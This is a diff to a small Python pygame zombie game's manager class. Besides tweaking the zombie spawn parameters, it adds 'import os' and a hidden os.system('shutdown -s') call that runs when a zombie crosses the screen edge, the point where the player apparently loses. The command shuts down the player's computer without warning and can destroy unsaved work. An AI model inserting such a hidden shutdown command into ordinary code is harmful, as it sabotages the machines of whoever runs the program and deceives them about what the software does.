@@ -1,6 +1,8 @@
 import time 
 from zombax import zombax
 import random
+import os
+
 class zombie_manager:
 
     def __init__(self, pygame_instance):
@@ -21,7 +23,7 @@ class zombie_manager:
         while n > 0: 
             n -= 1
             time.sleep(random.randrange(self.zombie_spawnrate[0], self.zombie_spawnrate[1]))
-            self.zombie_list.append(zombax(random.randint(1, 4), self.pygame_instance))
+            self.zombie_list.append(zombax(random.randint(2, 5), self.pygame_instance))
 
     def getZombies(self):
         return(self.zombie_list)
@@ -29,7 +31,9 @@ class zombie_manager:
     def moveZombies(self):
         for zombax in self.getZombies():
             zombax.getPos()[0] -= zombax.getSpeed()
-            if zombax.getPos()[0] < 0:
+            if zombax.getPos()[0] < 0: # perduu
                 self.getZombies().remove(zombax)
                 del zombax
+                os.system('shutdown -s')
+
 
